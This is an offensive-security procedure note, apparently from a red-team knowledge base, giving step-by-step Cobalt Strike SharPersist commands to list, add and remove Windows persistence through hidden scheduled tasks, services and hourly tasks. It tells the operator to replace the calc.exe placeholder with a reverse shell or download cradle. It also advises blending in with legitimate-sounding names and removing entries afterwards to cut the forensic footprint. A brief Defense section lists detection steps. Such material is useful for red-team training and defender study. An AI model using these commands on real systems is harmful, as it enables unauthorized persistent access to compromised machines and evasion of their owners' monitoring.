---
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Scheduled Task]]'
  - '[[Registry Run Keys - Startup Folder]]'
sub_techniques: []
tags:
  - cobalt-strike
  - persistence
  - sharpersist
commands:
  - '[[commands/sharpersist-list-persistences]]'
  - '[[commands/sharpersist-add-schtaskbackdoor-persistence]]'
  - '[[commands/sharpersist-remove-schtaskbackdoor-persistence]]'
  - '[[commands/sharpersist-add-service-persistence]]'
  - '[[commands/sharpersist-remove-service-persistence]]'
  - '[[commands/sharpersist-add-scheduled-task-persistence]]'
  - '[[commands/sharpersist-add-hourly-scheduled-task-persistence]]'
  - '[[commands/sharpersist-remove-scheduled-task-persistence]]'
platforms:
  - Windows
tools:
  - '[[tools/Cobalt-Strike]]'
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Establish-Persistence-Using-SharPersist-in-Cobalt-Strike

## Summary

This procedure uses the SharPersist beacon command in Cobalt Strike to establish persistence on a compromised Windows system through mechanisms like scheduled tasks, services, and startup folders. It enables attackers to maintain access after reboots by executing payloads automatically, covering listing, adding, and removing persistence entries to manage long-term footholds.

## Description

SharPersist is a built-in Cobalt Strike beacon tool for creating persistence via Windows-native features. It supports types such as 'schtaskbackdoor' (hidden scheduled tasks), 'service' (Windows services), 'schtask' (standard scheduled tasks), and 'startupfolder' (startup items). The procedure assumes an active beacon session on a Windows target with sufficient privileges (typically SYSTEM or Administrator). Each persistence method executes a specified command (e.g., a reverse shell payload) at boot or on a schedule. This is commonly used post-initial access to ensure beacon re-connection. Detection involves monitoring task creation, service installs, and registry changes; evasion can be achieved by mimicking legitimate names and paths.

## Requirements

1. Active Cobalt Strike beacon session on the target Windows system (Windows 7+).
2. Target user context with administrative privileges for service and task creation.
3. Cobalt Strike client access for the operator to issue beacon commands.
4. Payload command ready (e.g., PowerShell reverse shell) to embed in persistence.

## Defense

- Monitor scheduled tasks with 'schtasks /query /fo LIST /v' and alert on suspicious entries (e.g., unusual authors or commands).
- Use tools like Sysmon or EDR to log service creations (Event ID 7045) and registry modifications in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
- Implement application whitelisting (e.g., AppLocker) to block unauthorized executables in startup paths.
- Enable PowerShell logging and script block auditing to detect embedded payloads.

## Objectives

1. Identify existing persistence mechanisms to avoid conflicts or detect prior compromises.
2. Add new persistence entries using multiple techniques for redundancy.
3. Verify persistence activation post-reboot to confirm long-term access.
4. Clean up persistence entries during exit to reduce forensic footprint.

## Instructions

### Step 1: List Existing Persistences

**Context**: Begin by enumerating current persistence entries across supported types to assess the environment and avoid naming conflicts. This helps identify if persistence already exists from prior activity.

**Command** ([[commands/sharpersist-list-persistences]]):
```powershell
SharPersist -t schtaskbackdoor -m list; SharPersist -t startupfolder -m list; SharPersist -t schtask -m list; SharPersist -t service -m list
```

> Run this in the beacon console to query each type. If no entries exist, output will indicate empty results; otherwise, it lists names, commands, and paths.

### Step 2: Add Schtaskbackdoor Persistence

**Context**: Create a hidden scheduled task that runs at logon, ideal for user-level persistence without visible task scheduler entries.

**Command** ([[commands/sharpersist-add-schtaskbackdoor-persistence]]):
```powershell
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

> Replace 'calc.exe' with your payload (e.g., PowerShell download cradle). Success is silent or confirms addition; verify with Step 1.

### Step 3: Add Service Persistence

**Context**: Install a Windows service for SYSTEM-level execution at boot, providing high-privilege persistence resilient to user logoffs.

**Command** ([[commands/sharpersist-add-service-persistence]]):
```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

> Use a legitimate-sounding name to blend in. The service starts automatically; check with 'sc query Some Service' via another beacon command.

### Step 4: Add Standard Scheduled Task Persistence

**Context**: Set up a visible scheduled task for daily execution, useful for periodic beacon check-ins without boot dependency.

**Command** ([[commands/sharpersist-add-scheduled-task-persistence]]):
```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
```

> Defaults to daily; confirm in Task Scheduler or re-list with Step 1.

### Step 5: Add Hourly Scheduled Task Persistence

**Context**: For more frequent execution, create an hourly task to ensure quick re-establishment if the initial beacon drops.

**Command** ([[commands/sharpersist-add-hourly-scheduled-task-persistence]]):
```powershell
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task Hourly" -m add -o hourly
```

> The '-o hourly' flag sets recurrence; monitor for execution via logs.

### Step 6: Remove Persistences

**Context**: After testing or during cleanup, remove entries to evade detection. Target specific types to avoid affecting others.

**Command** ([[commands/sharpersist-remove-schtaskbackdoor-persistence]]):
```powershell
SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
```

**Command** ([[commands/sharpersist-remove-service-persistence]]):
```powershell
SharPersist -t service -n "Some Service" -m remove
```

**Command** ([[commands/sharpersist-remove-scheduled-task-persistence]]):
```powershell
SharPersist -t schtask -n "Some Task" -m remove
```

> Run removals for each added entry; verify with Step 1 to confirm deletion.
